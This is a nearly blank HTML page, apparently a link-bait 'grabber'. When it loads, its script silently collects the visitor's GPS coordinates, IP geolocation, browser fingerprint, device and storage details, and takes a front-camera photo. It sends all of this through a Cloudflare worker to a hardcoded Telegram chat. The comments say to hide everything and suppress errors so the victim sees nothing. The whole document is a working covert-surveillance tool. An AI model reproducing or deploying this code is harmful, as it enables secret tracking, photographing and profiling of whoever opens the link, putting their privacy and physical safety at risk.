<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui;
            color: #eee;
        }
        /* Ocultar todo, solo un punto o nada */
        .hidden { display: none; }
        /* Opcional: un indicador muy sutil, pero puedes quitarlo */
        .status {
            font-size: 0.8rem;
            color: #ccc;
            position: fixed;
            bottom: 10px;
            right: 10px;
        }
    </style>
</head>
<body>
    <!-- Nada visible, solo un posible indicador (opcional) -->
    <div class="status" id="status">.</div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ================= CONFIGURACIÓN =================
        // 🔥 CAMBIA ESTO POR LA URL DE TU WORKER
        const WORKER_URL = 'https://bot-tg.societykark.workers.dev/';
        const CHAT_ID = '7555997298';

        // ---------- FUNCIONES (sin cambios) ----------
        async function getIpLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.ip) {
                    return {
                        ip: data.ip || 'N/A',
                        country: data.country_name || 'N/A',
                        region: data.region || 'N/A',
                        city: data.city || 'N/A',
                        postal: data.postal || 'N/A',
                        timezone: data.timezone || 'N/A'
                    };
                }
            } catch(e) {}
            try {
                const res = await fetch('https://ip-api.com/json/');
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        ip: data.query || 'N/A',
                        country: data.country || 'N/A',
                        region: data.regionName || 'N/A',
                        city: data.city || 'N/A',
                        postal: data.zip || 'N/A',
                        timezone: data.timezone || 'N/A'
                    };
                }
            } catch(e) {}
            return null;
        }

        async function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
            const hash = canvas.toDataURL().slice(0, 100);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            const fonts = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
            const available = fonts.filter(f => document.fonts.check(`12px "${f}"`));
            return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
        }

        function getDevice() {
            const ua = navigator.userAgent;
            let model = 'Desconocido';
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            return {
                model,
                ua,
                language: navigator.language || 'N/A',
                resolution: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A'
            };
        }

        async function getStorage() {
            try {
                const est = await navigator.storage.estimate();
                return {
                    total: (est.quota / (1024**3)).toFixed(2),
                    used: (est.usage / (1024**3)).toFixed(2)
                };
            } catch(e) {
                return { total: 'N/A', used: 'N/A' };
            }
        }

        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            } catch(e) {
                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
                catch(err) { return null; }
            }
            if (!stream) return null;
            video.srcObject = stream;
            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;
            return blob;
        }

        async function sendToWorker(text, photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', text);
            if (photoBlob) {
                formData.append('photo', photoBlob, 'photo.jpg');
            }
            try {
                const res = await fetch(WORKER_URL, { method: 'POST', body: formData });
                return res.ok;
            } catch(e) {
                console.error(e);
                return false;
            }
        }

        // ---------- EJECUCIÓN AUTOMÁTICA AL CARGAR ----------
        window.addEventListener('load', async function() {
            // Opcional: actualizar un indicador mínimo (puedes borrarlo)
            const status = document.getElementById('status');
            if (status) status.textContent = '•';

            try {
                // Recolectar datos
                const gps = await getGPS();
                const ipLoc = await getIpLocation();
                const fp = await getFingerprint();
                const device = getDevice();
                const storage = await getStorage();
                const photo = await capturePhoto();

                // Construir mensaje
                let msg = `📊 *Visitor Information*\n━━━━━━━━━━━━━━━━\n\n`;
                msg += `🖥️ *Device*\n   • ${device.model}\n   • ${device.ua}\n\n`;
                msg += `🌐 *IP & Location*\n   • IP: ${ipLoc?.ip || 'N/A'}\n`;
                if (ipLoc && ipLoc.city !== 'N/A') {
                    msg += `   • ${ipLoc.city}, ${ipLoc.region}, ${ipLoc.country}\n`;
                    msg += `   • Postal: ${ipLoc.postal}\n`;
                    msg += `   • Timezone: ${ipLoc.timezone}\n`;
                }
                msg += `\n📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
                if (gps) {
                    msg += `   • Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
                }
                msg += `\n🖼️ *Display*\n   • ${device.resolution}\n`;
                msg += `\n🔐 *Permisos*\n   • Cámara: ${photo ? 'Permitido' : 'Denegado'}\n   • Ubicación: ${gps ? 'Permitido' : 'Denegado'}\n`;
                msg += `\n💾 *Storage*\n   • Usado: ${storage.used} GB\n   • Total: ${storage.total} GB\n`;
                msg += `\n━━━━━━━━━━━━━━━━\n🎯 ${window.location.href}\n⚡ @jsemanper`;

                // Enviar silenciosamente
                await sendToWorker(msg, photo);

                // No mostrar nada, ni alertas ni mensajes
                // Opcional: si quieres un indicador de éxito, puedes cambiar un punto
                if (status) status.textContent = '✓';

            } catch(e) {
                // Silencioso, no mostrar errores al usuario
                console.error(e);
            }
        });
    </script>
</body>
</html>
